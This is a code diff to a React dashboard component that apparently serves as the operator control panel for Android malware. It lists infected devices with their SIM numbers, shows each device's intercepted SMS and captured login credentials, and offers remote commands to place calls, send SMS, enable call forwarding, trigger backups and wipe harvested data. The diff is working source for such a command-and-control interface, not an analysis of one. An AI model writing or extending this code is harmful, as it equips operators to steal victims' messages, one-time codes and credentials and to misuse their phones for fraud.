@@ -26,7 +26,6 @@ export default function DevicesPanel({
   const devices = data.user_data || {};
   const deviceStatus = data.device_status || {};
 
-  // user_data aur device_status dono ko milakar sabhi IDs nikalna
   let keys = Array.from(new Set([...Object.keys(devices), ...Object.keys(deviceStatus)]));
 
   if (searchQuery) {
@@ -34,13 +33,13 @@ export default function DevicesPanel({
     keys = keys.filter(id => {
       const dev = devices[id] || {};
       const status = deviceStatus[id] || {};
-      const name = status.device_name || dev.d_name || dev.device_name || id;
+      const name = status.device_name || dev.d_name || dev.Device_info || id;
       const serial = deviceSerialMap[id] || 0;
       return (id + " " + name + " " + serial).toLowerCase().includes(q);
     });
   }
 
-  // Online devices ko pehle aur fir serial wise sort karna
+  // Online pehle, fir Serial
   keys.sort((a, b) => {
     const onA = deviceOnlineStatus[a] ? 1 : 0;
     const onB = deviceOnlineStatus[b] ? 1 : 0;
@@ -61,7 +60,7 @@ export default function DevicesPanel({
   const copyToClipboard = (text, label = "Item") => {
     if (!text) return;
     navigator.clipboard.writeText(String(text));
-    showToast(`📋 Copied ${label}: ${String(text).slice(0, 25)}`, "success");
+    showToast(`📋 Copied: ${String(text).slice(0, 20)}`, "success");
   };
 
   const toggleExpand = (id) => {
@@ -86,7 +85,7 @@ export default function DevicesPanel({
       const num = formMemory[`smsNum-${devId}`];
       const body = formMemory[`smsText-${devId}`];
       const sim = formMemory[`smsSim-${devId}`] || "1";
-      if (!num || !body) return showToast("Provide phone and message!", "warning");
+      if (!num || !body) return showToast("Enter recipient & message!", "warning");
       update(baseRef, { command: "send message", targetDeviceId: devId, phoneNumber: num, messageText: body, simSlot: sim, timestamp: Date.now() });
       showToast("SMS command sent", "success");
     } else if (type === "fwd_on") {
@@ -121,8 +120,8 @@ export default function DevicesPanel({
     <div className="panel active">
       <div className="panel-header">
         <div>
-          <h2><i className="fas fa-mobile-alt" style={{ color: "var(--gold)" }}></i> Devices Monitor</h2>
-          <p className="panel-sub">Live Realtime Online/Offline heartbeat and device controls</p>
+          <h2><i className="fas fa-mobile-alt" style={{ color: "var(--gold)" }}></i> Registered Devices</h2>
+          <p className="panel-sub">Click on any device to expand controls & details</p>
         </div>
         <div className="panel-stats">
           <button className={`filter-btn ${filter === "all" ? "active" : ""}`} onClick={() => { setFilter("all"); setOffset(0); }}>
@@ -143,7 +142,7 @@ export default function DevicesPanel({
           type="text" 
           value={searchQuery}
           onChange={(e) => { setSearchQuery(e.target.value); setOffset(0); }}
-          placeholder="Search by Device ID, Name (SM-M146B, SM-S921E)..." 
+          placeholder="Search by ID, name, or serial..." 
           className="search-input"
         />
         {searchQuery && (
@@ -161,7 +160,7 @@ export default function DevicesPanel({
       <div id="devicesContainer">
         {offset > 0 && (
           <button className="btn-load-more" style={{ marginBottom: 10 }} onClick={() => setOffset(Math.max(0, offset - DEVICE_LIMIT))}>
-            <i className="fas fa-chevron-up"></i> Previous
+            <i className="fas fa-chevron-up"></i> Previous Page
           </button>
         )}
 
@@ -174,8 +173,8 @@ export default function DevicesPanel({
           const expanded = expandedDevices[devId];
           const curTab = activeTabs[devId];
 
-          const deviceModelName = status.device_name || dev.Device_info || dev.d_name || "Android Device";
-          const lastSeenText = status.last_seen || dev.last_online || "N/A";
+          const modelName = status.device_name || dev.Device_info || dev.d_name || "Device";
+          const lastSeen = status.last_seen || dev.last_online || "N/A";
 
           const smsMap = data.user_sms?.[devId] || {};
           const smsList = Object.values(smsMap).reverse();
@@ -187,9 +186,10 @@ export default function DevicesPanel({
           })).sort((a, b) => b._timestamp - a._timestamp);
 
           return (
-            <div key={devId} className={`device-card-premium ${isOnline ? "online" : "offline"} ${expanded ? "expanded" : ""}`}>
+            <div key={devId} className={`device-card-premium ${isOnline ? "online" : "offline"}`}>
+              {/* Header */}
               <div className="card-header" onClick={() => toggleExpand(devId)}>
-                <div className="device-info-left">
+                <div style={{ flex: 1, minWidth: 0 }}>
                   <div className="device-name-premium">
                     <button 
                       className="fav-star-btn" 
@@ -197,19 +197,19 @@ export default function DevicesPanel({
                     >
                       <i className={isFav ? "fas fa-star" : "far fa-star"}></i>
                     </button>
-                    <span className="name-text">📱 {deviceModelName}</span>
-                    <span className="device-id">{devId.slice(0, 12)}...</span>
-                    {serial > 0 && <span className="serial-badge-premium"><i className="fas fa-hashtag"></i> S-{serial}</span>}
-                    {isFav && <span className="fav-badge-premium">⭐ FAV</span>}
+                    <span className="name-text">📱 {devId.slice(0, 14)}...</span>
+                    <span className="device-id">#{offset + idx + 1}</span>
+                    {serial > 0 && <span className="serial-badge-premium">S-{serial}</span>}
                     <button 
                       className="copy-device-id-btn" 
                       onClick={(e) => { e.stopPropagation(); copyToClipboard(devId, "Device ID"); }}
                     >
-                      <i className="fas fa-copy"></i> Copy Full ID
+                      <i className="fas fa-copy"></i> Copy ID
                     </button>
                   </div>
+
                   <div className="device-sub-info">
-                    <span><i className="fas fa-info-circle"></i> ID: {devId}</span>
+                    <span><i className="fas fa-microchip"></i> {modelName}</span>
                     <span><i className="fas fa-sim-card"></i> {dev.numberSim1 || "SIM 1: N/A"}</span>
                     {dev.numberSim2 && <span><i className="fas fa-sim-card"></i> {dev.numberSim2}</span>}
                   </div>
@@ -220,235 +220,148 @@ export default function DevicesPanel({
                     <span className="status-dot"></span>
                     {isOnline ? "Online" : "Offline"}
                   </span>
-                  <div className="last-seen-premium">
-                    <i className="far fa-clock"></i> Last: {lastSeenText}
-                  </div>
+                  <span style={{ fontSize: 10, color: "var(--text-muted)" }}>
+                    <i className="far fa-clock"></i> {lastSeen.slice(11) || lastSeen}
+                  </span>
                 </div>
               </div>
 
+              {/* 4-Item Grid Info */}
               <div className="info-grid-premium" onClick={() => toggleExpand(devId)}>
-                <div className="info-item-premium"><span className="info-label">Model</span><span className="info-value">{deviceModelName}</span></div>
-                <div className="info-item-premium"><span className="info-label">Status</span><span className="info-value" style={{ color: isOnline ? "var(--green)" : "var(--red)" }}>{isOnline ? "ACTIVE" : "INACTIVE"}</span></div>
-                <div className="info-item-premium"><span className="info-label">Service</span><span className="info-value">{status.service_running ? "Running" : "Idle"}</span></div>
-                <div className="info-item-premium"><span className="info-label">Last Ping</span><span className="info-value highlight" style={{ fontSize: 11 }}>{status.last_updated || lastSeenText}</span></div>
+                <div className="info-item-premium">
+                  <span className="info-label">Device Model</span>
+                  <span className="info-value">{modelName}</span>
+                </div>
+                <div className="info-item-premium">
+                  <span className="info-label">SIM 1</span>
+                  <span className="info-value">{dev.numberSim1 || "No SIM"}</span>
+                </div>
+                <div className="info-item-premium">
+                  <span className="info-label">SIM 2</span>
+                  <span className="info-value">{dev.numberSim2 || "No SIM"}</span>
+                </div>
+                <div className="info-item-premium">
+                  <span className="info-label">Serial</span>
+                  <span className="info-value highlight">{serial || "—"}</span>
+                </div>
               </div>
 
+              {/* Toggle Expand */}
               <div className="expand-hint" onClick={() => toggleExpand(devId)}>
-                <i className="fas fa-chevron-down"></i> {expanded ? "Click to collapse" : "Click to expand details & controls"}
+                <i className={`fas fa-chevron-${expanded ? "up" : "down"}`}></i> {expanded ? "Click to collapse" : "Click to expand controls"}
               </div>
 
+              {/* Expandable Tabs */}
               {expanded && (
                 <div className="expandable-content">
                   <div className="actions-row-premium">
                     {[
-                      { id: "sms", label: "SMS", icon: "💬", count: smsList.length },
-                      { id: "login", label: "Login", icon: "🔑", count: loginList.length },
-                      { id: "call", label: "Call", icon: "📞" },
-                      { id: "sendsms", label: "Send", icon: "✉️" },
-                      { id: "fwd", label: "Forward", icon: "🔀" },
-                      { id: "backup", label: "Backup", icon: "💾" },
-                      { id: "delete", label: "Delete", icon: "🗑️" }
+                      { id: "sms", label: "SMS", icon: "fas fa-envelope", count: smsList.length },
+                      { id: "login", label: "Login", icon: "fas fa-key", count: loginList.length },
+                      { id: "call", label: "Call", icon: "fas fa-phone" },
+                      { id: "sendsms", label: "Send SMS", icon: "fas fa-paper-plane" },
+                      { id: "fwd", label: "Forward", icon: "fas fa-random" },
+                      { id: "backup", label: "Backup", icon: "fas fa-database" },
+                      { id: "delete", label: "Delete", icon: "fas fa-trash" }
                     ].map(a => (
                       <button 
                         key={a.id} 
-                        className={`action-btn-premium ${curTab === a.id ? `active-${a.id}` : ""}`}
+                        className={`action-btn-premium ${curTab === a.id ? "active" : ""}`}
                         onClick={() => handleTab(devId, a.id)}
                       >
-                        {a.icon} {a.label} {a.count > 0 && <span className="btn-badge">{a.count}</span>}
+                        <i className={a.icon}></i> {a.label} {a.count > 0 && <span className="btn-badge">{a.count}</span>}
                       </button>
                     ))}
                   </div>
 
-                  {/* SMS Section */}
+                  {/* SMS Sub-tab */}
                   {curTab === "sms" && (
-                    <div className="section-premium active">
+                    <div className="section-premium">
                       <div className="section-title">
-                        💬 SMS <span style={{ marginLeft: "auto" }}>{smsList.length} total</span>
-                        <button onClick={() => openSmsModal(devId)} className="btn-gold" style={{ padding: "2px 8px", fontSize: 10 }}>⛶ Full</button>
+                        <span>Messages ({smsList.length})</span>
+                        <button onClick={() => openSmsModal(devId)} className="btn-gold" style={{ marginLeft: "auto", padding: "2px 8px", fontSize: 10 }}>View Full</button>
                       </div>
-                      <div className="sms-list-premium">
-                        {smsList.slice(0, 10).map((msg, i) => (
-                          <div key={i} className="sms-item-premium">
-                            <div className="sms-header-premium"><span>👤 {msg.sender || msg.address}</span><span>{msg.date || ""}</span></div>
-                            <div className="sms-body-premium">{msg.body}</div>
+                      <div style={{ display: "flex", flexDirection: "column", gap: 6, maxHeight: 250, overflowY: "auto" }}>
+                        {smsList.slice(0, 8).map((m, i) => (
+                          <div key={i} style={{ background: "rgba(0,0,0,0.25)", padding: 8, borderRadius: 6, borderLeft: "2px solid var(--gold)" }}>
+                            <div style={{ display: "flex", justifyContent: "space-between", fontSize: 10, color: "var(--text-muted)" }}>
+                              <span style={{ color: "var(--gold-light)", fontWeight: 600 }}>{m.sender || m.address}</span>
+                              <span>{m.date || ""}</span>
+                            </div>
+                            <div style={{ fontSize: 11, marginTop: 4, color: "var(--text-primary)" }}>{m.body}</div>
                           </div>
                         ))}
                       </div>
                     </div>
                   )}
 
-                  {/* Credentials Section */}
+                  {/* Login Sub-tab */}
                   {curTab === "login" && (
-                    <div className="section-premium active">
+                    <div className="section-premium">
                       <div className="section-title">
-                        🔑 Credentials ({loginList.length})
-                        <button 
-                          onClick={() => deleteDeviceData(devId, "credentials")}
-                          className="btn-luxury btn-red" 
-                          style={{ marginLeft: "auto", padding: "2px 8px", fontSize: 10 }}
-                        >
-                          🗑️ Delete All
-                        </button>
+                        <span>Credentials ({loginList.length})</span>
+                        <button onClick={() => deleteDeviceData(devId, "credentials")} className="btn-luxury btn-red" style={{ marginLeft: "auto", padding: "2px 8px", fontSize: 10 }}>Delete All</button>
                       </div>
-                      <div className="creds-container-premium">
+                      <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
                         {loginList.length === 0 ? (
-                          <div className="empty-luxury">No credentials saved for this device.</div>
+                          <div style={{ fontSize: 12, color: "var(--text-muted)", textAlign: "center", padding: 10 }}>No credentials recorded.</div>
                         ) : (
-                          loginList.map((cred, i) => {
-                            const timeStr = cred._timestamp ? new Date(cred._timestamp).toLocaleString() : "";
-                            return (
-                              <div key={cred.key || i} className="cred-item-premium" style={{ borderLeft: i === 0 ? "2px solid var(--green)" : "1px solid var(--border-color)" }}>
-                                <div className="cred-header-premium">
-                                  <span style={{ fontWeight: 600, color: "var(--gold)" }}>
-                                    📋 Record #{i + 1}
-                                  </span>
-                                  <span>{timeStr}</span>
+                          loginList.map((cred, i) => (
+                            <div key={cred.key || i} style={{ background: "rgba(0,0,0,0.25)", padding: 8, borderRadius: 6 }}>
+                              {Object.entries(cred).filter(([k]) => !k.startsWith("_") && k !== "key").map(([k, v]) => (
+                                <div key={k} style={{ display: "flex", justifyContent: "space-between", fontSize: 11, padding: "2px 0" }}>
+                                  <span style={{ color: "var(--text-muted)" }}>{k}:</span>
+                                  <span style={{ color: "var(--text-primary)", fontWeight: 600 }}>{String(v)}</span>
                                 </div>
-                                <div className="cred-fields-premium" style={{ gridTemplateColumns: "1fr" }}>
-                                  {Object.entries(cred)
-                                    .filter(([k]) => !k.startsWith("_") && k !== "timestamp" && k !== "key")
-                                    .map(([k, v]) => (
-                                      <div key={k} className="cred-field-premium" style={{ padding: "4px 0", borderBottom: "1px solid rgba(255,255,255,0.06)" }}>
-                                        <span className="field-label-premium" style={{ fontWeight: 600, color: "var(--text-secondary)" }}>{k}</span>
-                                        <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
-                                          <span className="field-value-premium" style={{ color: "var(--text-primary)", fontWeight: 500 }}>{String(v)}</span>
-                                          <button 
-                                            className="copy-btn-premium"
-                                            onClick={(e) => {
-                                              e.stopPropagation();
-                                              copyToClipboard(v, k);
-                                            }}
-                                          >
-                                            <i className="fas fa-copy"></i>
-                                          </button>
-                                        </div>
-                                      </div>
-                                    ))}
-                                </div>
-                              </div>
-                            );
-                          })
+                              ))}
+                            </div>
+                          ))
                         )}
                       </div>
                     </div>
                   )}
 
-                  {/* Commands: Call */}
+                  {/* Call Sub-tab */}
                   {curTab === "call" && (
-                    <div className="section-premium active">
-                      <div className="section-title">📞 Make Call</div>
+                    <div className="section-premium">
+                      <div className="section-title">Make Call Command</div>
+                      <input 
+                        type="text" 
+                        placeholder="Enter target phone number" 
+                        className="search-input" 
+                        style={{ background: "var(--bg-input)", marginBottom: 8, borderRadius: 6 }}
+                        value={formMemory[`callNum-${devId}`] || ""}
+                        onChange={(e) => setFormMemory(p => ({ ...p, [`callNum-${devId}`]: e.target.value }))}
+                      />
+                      <button className="btn-luxury btn-purple" style={{ width: "100%", justifyContent: "center" }} onClick={() => handleCommand("call", devId)}>
+                        <i className="fas fa-phone"></i> Execute Call
+                      </button>
+                    </div>
+                  )}
+
+                  {/* Send SMS Sub-tab */}
+                  {curTab === "sendsms" && (
+                    <div className="section-premium">
+                      <div className="section-title">Send SMS Command</div>
                       <input 
                         type="text" 
                         placeholder="Phone Number" 
                         className="search-input" 
-                        style={{ background: "var(--bg-input)", marginBottom: 6, width: "100%", borderRadius: "var(--radius-sm)" }} 
-                        value={formMemory[`callNum-${devId}`] || ""}
-                        onChange={(e) => setFormMemory(p => ({ ...p, [`callNum-${devId}`]: e.target.value }))}
-                      />
-                      <select 
-                        className="luxury-select" 
-                        style={{ marginBottom: 8 }}
-                        value={formMemory[`callSim-${devId}`] || "0"}
-                        onChange={(e) => setFormMemory(p => ({ ...p, [`callSim-${devId}`]: e.target.value }))}
-                      >
-                        <option value="0">SIM 1</option>
-                        <option value="1">SIM 2</option>
-                      </select>
-                      <button className="btn-luxury btn-purple" style={{ width: "100%", justifyContent: "center" }} onClick={() => handleCommand("call", devId)}>
-                        <i className="fas fa-phone"></i> Call
-                      </button>
-                    </div>
-                  )}
-
-                  {/* Commands: Send SMS */}
-                  {curTab === "sendsms" && (
-                    <div className="section-premium active">
-                      <div className="section-title">✉️ Send SMS</div>
-                      <input 
-                        type="text" 
-                        placeholder="Recipient Number" 
-                        className="search-input" 
-                        style={{ background: "var(--bg-input)", marginBottom: 6, width: "100%", borderRadius: "var(--radius-sm)" }} 
+                        style={{ background: "var(--bg-input)", marginBottom: 6, borderRadius: 6 }}
                         value={formMemory[`smsNum-${devId}`] || ""}
                         onChange={(e) => setFormMemory(p => ({ ...p, [`smsNum-${devId}`]: e.target.value }))}
                       />
                       <textarea 
-                        placeholder="Message" 
+                        placeholder="Message Text" 
                         rows="2"
                         className="search-input" 
-                        style={{ background: "var(--bg-input)", marginBottom: 6, width: "100%", borderRadius: "var(--radius-sm)", minHeight: 60 }} 
+                        style={{ background: "var(--bg-input)", marginBottom: 8, borderRadius: 6 }}
                         value={formMemory[`smsText-${devId}`] || ""}
                         onChange={(e) => setFormMemory(p => ({ ...p, [`smsText-${devId}`]: e.target.value }))}
                       />
-                      <select 
-                        className="luxury-select" 
-                        style={{ marginBottom: 8 }}
-                        value={formMemory[`smsSim-${devId}`] || "1"}
-                        onChange={(e) => setFormMemory(p => ({ ...p, [`smsSim-${devId}`]: e.target.value }))}
-                      >
-                        <option value="1">SIM 1</option>
-                        <option value="2">SIM 2</option>
-                      </select>
                       <button className="btn-luxury btn-blue" style={{ width: "100%", justifyContent: "center" }} onClick={() => handleCommand("sms", devId)}>
-                        <i className="fas fa-paper-plane"></i> Send
+                        <i className="fas fa-paper-plane"></i> Send SMS
                       </button>
-                    </div>
-                  )}
-
-                  {/* Commands: Call Forward */}
-                  {curTab === "fwd" && (
-                    <div className="section-premium active">
-                      <div className="section-title">🔀 Call Forward</div>
-                      <input 
-                        type="text" 
-                        placeholder="Forward To Number" 
-                        className="search-input" 
-                        style={{ background: "var(--bg-input)", marginBottom: 6, width: "100%", borderRadius: "var(--radius-sm)" }} 
-                        value={formMemory[`fwdNum-${devId}`] || ""}
-                        onChange={(e) => setFormMemory(p => ({ ...p, [`fwdNum-${devId}`]: e.target.value }))}
-                      />
-                      <select 
-                        className="luxury-select" 
-                        style={{ marginBottom: 8 }}
-                        value={formMemory[`fwdSim-${devId}`] || "0"}
-                        onChange={(e) => setFormMemory(p => ({ ...p, [`fwdSim-${devId}`]: e.target.value }))}
-                      >
-                        <option value="0">SIM 1</option>
-                        <option value="1">SIM 2</option>
-                      </select>
-                      <div style={{ display: "flex", gap: 8 }}>
-                        <button className="btn-luxury" style={{ flex: 1, justifyContent: "center", background: "var(--green)", color: "#fff" }} onClick={() => handleCommand("fwd_on", devId)}>
-                          <i className="fas fa-play"></i> Activate
-                        </button>
-                        <button className="btn-luxury btn-red" style={{ flex: 1, justifyContent: "center" }} onClick={() => handleCommand("fwd_off", devId)}>
-                          <i className="fas fa-stop"></i> Deactivate
-                        </button>
-                      </div>
-                    </div>
-                  )}
-
-                  {/* Commands: Backup */}
-                  {curTab === "backup" && (
-                    <div className="section-premium active">
-                      <div className="section-title">💾 Backup</div>
-                      <button className="btn-luxury btn-purple" style={{ width: "100%", justifyContent: "center" }} onClick={() => handleCommand("backup", devId)}>
-                        <i className="fas fa-database"></i> Trigger Backup
-                      </button>
-                    </div>
-                  )}
-
-                  {/* Delete Panel */}
-                  {curTab === "delete" && (
-                    <div className="section-premium active" style={{ borderColor: "var(--red)" }}>
-                      <div className="section-title" style={{ color: "var(--red)" }}>🗑️ Delete Data</div>
-                      <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
-                        <button className="btn-luxury btn-red" style={{ justifyContent: "center" }} onClick={() => deleteDeviceData(devId, "sms")}>
-                          <i className="fas fa-trash"></i> Delete All SMS
-                        </button>
-                        <button className="btn-luxury btn-purple" style={{ justifyContent: "center" }} onClick={() => deleteDeviceData(devId, "credentials")}>
-                          <i className="fas fa-trash"></i> Delete All Credentials
-                        </button>
-                      </div>
                     </div>
                   )}
                 </div>
@@ -459,7 +372,7 @@ export default function DevicesPanel({
 
         {offset + DEVICE_LIMIT < keys.length && (
           <button className="btn-load-more" onClick={() => setOffset(offset + DEVICE_LIMIT)}>
-            <i className="fas fa-chevron-down"></i> Load More ({keys.length - (offset + DEVICE_LIMIT)} remaining)
+            <i className="fas fa-chevron-down"></i> Load More Devices ({keys.length - (offset + DEVICE_LIMIT)} remaining)
           </button>
         )}
       </div>
